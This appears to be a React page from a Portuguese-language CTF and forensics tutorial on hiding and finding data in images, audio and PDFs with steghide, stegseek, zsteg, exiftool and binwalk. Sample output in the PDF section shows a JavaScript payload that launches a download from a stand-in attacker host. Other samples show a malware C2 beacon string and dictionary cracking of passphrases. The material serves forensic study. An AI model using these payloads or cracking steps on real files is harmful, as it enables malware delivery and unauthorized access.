import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { OutputBlock } from "@/components/ui/OutputBlock";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function Steganografia() {
  return (
    <PageContainer
      title="Esteganografia — esconder dados em mídia"
      subtitle="steghide, stegseek, zsteg, exiftool, binwalk, foremost. Esconder e descobrir payloads em jpg/png/wav/pdf."
      difficulty="intermediario"
      timeToRead="14 min"
    >
      <h2>O que é</h2>
      <p>
        Esteganografia esconde dados <strong>dentro</strong> de outro arquivo (imagem, áudio,
        vídeo, PDF) sem alterar visivelmente. Usado em CTF (forense), em malware (C2 escondido em
        meme) e em vazamentos disfarçados (PDF com payload embutido).
      </p>

      <h2>steghide — JPG / WAV / BMP / AU</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo apt install -y steghide",
            out: "(já vem no Kali)",
            outType: "muted",
          },
          {
            comment: "esconder secret.txt dentro de foto.jpg com senha",
            cmd: "steghide embed -ef secret.txt -cf foto.jpg -p 'minhasenha'",
            out: `embedding "secret.txt" in "foto.jpg"... done`,
            outType: "success",
          },
          {
            cmd: "ls -la foto.jpg",
            out: `-rw-r--r-- 1 wallyson wallyson 482841 Apr  3 15:14 foto.jpg
(arquivo praticamente do mesmo tamanho — diferença ~ tamanho do secret.txt)`,
            outType: "info",
          },
          {
            comment: "extrair (precisa da mesma senha)",
            cmd: "steghide extract -sf foto.jpg -p 'minhasenha'",
            out: `wrote extracted data to "secret.txt".`,
            outType: "success",
          },
          {
            comment: "ver info sem extrair",
            cmd: "steghide info foto.jpg",
            out: `"foto.jpg":
  format: jpeg
  capacity: 22.4 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "secret.txt":
    size: 312.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes`,
            outType: "default",
          },
        ]}
      />

      <h2>stegseek — brute force de steghide (super rápido)</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo apt install -y stegseek",
            out: "(já vem no Kali)",
            outType: "muted",
          },
          {
            comment: "ataque por dicionário em JPG suspeito",
            cmd: "stegseek foto.jpg /usr/share/wordlists/rockyou.txt",
            out: `StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "minhasenha"

[i] Original filename: "secret.txt".
[i] Extracting to "foto.jpg.out".

(encontrou em < 5s testando 14M de senhas — muito mais rápido que steghide --crack)`,
            outType: "success",
          },
          {
            cmd: "cat foto.jpg.out",
            out: `(conteúdo do secret.txt original — pode ser texto, base64, hex...)`,
            outType: "info",
          },
        ]}
      />

      <h2>zsteg — PNG e BMP (LSB)</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo gem install zsteg",
            out: `Successfully installed zsteg-0.2.13`,
            outType: "muted",
          },
          {
            cmd: "zsteg desafio.png",
            out: `imagedata           .. text: "FLAG{lsb_em_canal_b}"
b1,bgr,lsb,xy       .. text: "FLAG{lsb_em_canal_b}"
b1,r,lsb,xy         .. file: PGP Secret Key -
b2,bgr,msb,xy       .. file: ELF 64-bit LSB executable, x86-64
b1,abgr,msb,xy      .. <wbStego size=58 enc=0>`,
            outType: "warning",
          },
          {
            comment: "extrair payload completo (b1,bgr,lsb,xy = LSB nos 3 canais)",
            cmd: "zsteg -E 'b1,bgr,lsb,xy' desafio.png > extraido.bin",
            out: "(silencioso)",
            outType: "muted",
          },
          {
            cmd: "file extraido.bin && head -c 100 extraido.bin",
            out: `extraido.bin: ASCII text
FLAG{lsb_em_canal_b}
== Payload extra ==
admin:Welcome2025!`,
            outType: "info",
          },
        ]}
      />

      <h2>exiftool — metadados</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "exiftool foto.jpg",
            out: `ExifTool Version Number         : 12.76
File Name                       : foto.jpg
File Size                       : 472 KB
File Modification Date/Time     : 2026:04:03 15:14:18-03:00
File Type                       : JPEG
MIME Type                       : image/jpeg
Image Width                     : 1920
Image Height                    : 1080
Make                            : Apple
Camera Model Name               : iPhone 14 Pro
Software                        : iOS 17.4.1
GPS Latitude                    : 23 deg 33' 22.42" S       ← geoloc!
GPS Longitude                   : 46 deg 38' 19.18" W
Create Date                     : 2026:03:21 14:42:18
Comment                         : <-- autor escondeu nota aqui!`,
            outType: "warning",
          },
          {
            comment: "limpar TODOS os metadados (importante antes de publicar foto)",
            cmd: "exiftool -all= foto.jpg",
            out: "    1 image files updated",
            outType: "success",
          },
          {
            comment: "extrair só GPS",
            cmd: "exiftool -GPSLatitude -GPSLongitude foto.jpg",
            out: `GPS Latitude                    : 23 deg 33' 22.42" S
GPS Longitude                   : 46 deg 38' 19.18" W`,
            outType: "info",
          },
          {
            comment: "extrair PDF metadados (autor, software, datas)",
            cmd: "exiftool documento.pdf | head -15",
            out: `Title                           : Confidencial - Plano 2026
Author                          : Ana Silva
Subject                         : Estratégia
Creator                         : Microsoft Word for Microsoft 365
Producer                        : Microsoft® Word for Microsoft 365
Create Date                     : 2026:03:18 14:21:11
Modify Date                     : 2026:04:03 09:11:42
Page Count                      : 42`,
            outType: "default",
          },
        ]}
      />

      <h2>binwalk — arquivos dentro de arquivos</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "binwalk suspeito.jpg",
            out: `DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, EXIF standard
30            0x1E            TIFF image data, big-endian
482841        0x75DD9         Zip archive data, at least v2.0 to extract
482979        0x75E63         End of Zip archive, footer length: 22       ← payload!`,
            outType: "warning",
          },
          {
            cmd: "binwalk -e suspeito.jpg",
            out: `DECIMAL  HEXADECIMAL    DESCRIPTION
--------------------------------------------------------------------------------
0        0x0            JPEG image data, EXIF standard
482841   0x75DD9        Zip archive data
482979   0x75E63        End of Zip archive

(extraído em _suspeito.jpg.extracted/)`,
            outType: "success",
          },
          {
            cmd: "ls _suspeito.jpg.extracted/ && cat _suspeito.jpg.extracted/secret.txt 2>/dev/null",
            out: `75DD9.zip   secret.txt

FLAG{binwalk_eh_seu_amigo}
admin:S3nh@F0rt3!`,
            outType: "info",
          },
          {
            comment: "extrair manualmente sem binwalk",
            cmd: "dd if=suspeito.jpg of=zip.zip bs=1 skip=482841 && unzip zip.zip",
            out: `Archive:  zip.zip
  inflating: secret.txt`,
            outType: "default",
          },
        ]}
      />

      <h2>foremost — recovery por carving</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo apt install -y foremost",
            out: "(já vem no Kali)",
            outType: "muted",
          },
          {
            cmd: "foremost -i imagem.dd -o saida/",
            out: `Foremost version 1.5.7
Audit File:        saida/audit.txt
Configuration:     /etc/foremost.conf

Total: 142 files extracted

jpg:142
png:18
pdf:7
zip:5
exe:2
doc:3`,
            outType: "info",
          },
          {
            cmd: "ls saida/",
            out: `audit.txt    doc/    exe/    jpg/    pdf/    png/    zip/`,
            outType: "default",
          },
        ]}
      />

      <h2>strings + grep — força bruta visual</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "pega TUDO que parece string num arquivo binário",
            cmd: "strings -n 6 desafio.png | grep -iE 'flag|ctf|secret|password|admin|key'",
            out: `FLAG{xampp_e_kali_e_amor}
adminPassword=
admin:Welcome2025!
secret_key=AKIA<EXEMPLO_FAKE_1>`,
            outType: "warning",
          },
          {
            comment: "strings UTF-16 (Windows-style)",
            cmd: "strings -e l malware.exe | head -10",
            out: `KERNEL32.DLL
LoadLibraryA
GetProcAddress
http://c2.malicioso.com/beacon
\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`,
            outType: "default",
          },
        ]}
      />

      <h2>Áudio — Audacity (espectrograma)</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "muitos CTFs escondem flag em ESPECTROGRAMA — abre no Audacity, modo Spectrogram",
            cmd: "audacity audio.wav &",
            out: `(GUI abre)
1. Track → Spectrogram view
2. Settings → Window size 4096
3. Veja a flag aparecer DESENHADA na visualização!`,
            outType: "muted",
          },
          {
            comment: "via CLI: sox + spectrogram em PNG",
            cmd: "sox audio.wav -n spectrogram -o spec.png",
            out: "(gera spec.png — abra com xdg-open)",
            outType: "default",
          },
          {
            comment: "Morse code? play em velocidade lenta",
            cmd: "sox suspeito.wav -t wav - speed 0.3 | aplay",
            out: "(escuta Morse devagar = decodifica de ouvido)",
            outType: "muted",
          },
        ]}
      />

      <h2>PDF — pdf-parser, pdfid</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "pdfid suspeito.pdf",
            out: `PDFiD 0.2.10 suspeito.pdf
 PDF Header: %PDF-1.5
 obj                   42
 endobj                42
 stream                 8
 endstream              8
 xref                   1
 trailer                1
 /JS                    2     ← JavaScript embarcado!
 /JavaScript            2
 /AA                    1     ← AdditionalActions (autoplay)
 /OpenAction            1     ← roda ao abrir
 /Launch                1     ← pode executar prog`,
            outType: "warning",
          },
          {
            cmd: "pdf-parser -s 'JavaScript' -O suspeito.pdf | head -30",
            out: `obj 14 0
 Type: /Action
 Referencing:

  <<
    /S /JavaScript
    /JS (
        app.alert("PWNED");
        var url = "http://atacante.com/x.exe";
        app.launchURL(url);
    )
  >>`,
            outType: "error",
          },
        ]}
      />

      <h2>Cheatsheet</h2>
      <CommandTable
        title="Tipo de arquivo → ferramenta"
        variations={[
          { cmd: "JPG", desc: "steghide / stegseek / exiftool / binwalk", output: "+ strings" },
          { cmd: "PNG", desc: "zsteg / exiftool / binwalk", output: "(steghide NÃO funciona em PNG)" },
          { cmd: "BMP", desc: "zsteg / steghide", output: "Bitmap == fácil esconder em LSB" },
          { cmd: "WAV", desc: "steghide / sonic-visualiser / sox spectrogram", output: "Espectrograma é frequente" },
          { cmd: "MP3", desc: "MP3Stego / mp3stegz", output: "Menos comum" },
          { cmd: "PDF", desc: "pdfid / pdf-parser / peepdf / qpdf", output: "Procurar /JS, /OpenAction" },
          { cmd: "DOCX/XLSX", desc: "unzip (são ZIPs!)", output: "Macro em word/vbaProject.bin" },
          { cmd: "ZIP/RAR", desc: "binwalk / fcrackzip / 7z2hashcat", output: "Senha → john --format=zip" },
          { cmd: "ELF/PE", desc: "strings / radare2 / ghidra", output: "Reverse eng" },
          { cmd: "qualquer", desc: "binwalk -e + foremost + strings", output: "Sempre rodar essa trinca!" },
        ]}
      />

      <PracticeBox
        title="Ciclo completo: esconda e descubra"
        goal="Esconder uma 'flag' em foto.jpg, depois recuperá-la 3 formas diferentes."
        steps={[
          "echo 'FLAG{stego_master}' > flag.txt",
          "steghide embed com senha 'kali'.",
          "Verifique tamanho similar ao original.",
          "Recupere com steghide extract (senha conhecida).",
          "Recupere com stegseek + rockyou (senha brute).",
          "Confirme metadados foram preservados com exiftool.",
        ]}
        command={`echo 'FLAG{stego_master}' > flag.txt
cp /usr/share/backgrounds/kali/default.png foto.jpg

steghide embed -ef flag.txt -cf foto.jpg -p kali
steghide info foto.jpg
steghide extract -sf foto.jpg -p kali -xf out1.txt
cat out1.txt

# brute force
stegseek foto.jpg /usr/share/wordlists/rockyou.txt
cat foto.jpg.out

# meta
exiftool foto.jpg | grep -E 'Author|Comment|Software'`}
        expected={`embedding "flag.txt" in "foto.jpg"... done

  embedded file "flag.txt": size: 19.0 Byte

wrote extracted data to "out1.txt".
FLAG{stego_master}

[i] Found passphrase: "kali"
FLAG{stego_master}`}
        verify="Original e foto.jpg pesam quase iguais (~ +1KB do payload + cipher)."
      />

      <AlertBox type="info" title="Sequência sagrada do CTF forense">
        Para QUALQUER arquivo desconhecido, sempre rode em ordem:
        <code>file</code> → <code>strings | head -50</code> → <code>exiftool</code> →
        <code>binwalk -e</code> → <code>foremost</code> → <code>steghide info</code> /
        <code>zsteg</code> → <code>hexdump -C | less</code>. 80% dos desafios saem nessas etapas.
      </AlertBox>
    </PageContainer>
  );
}
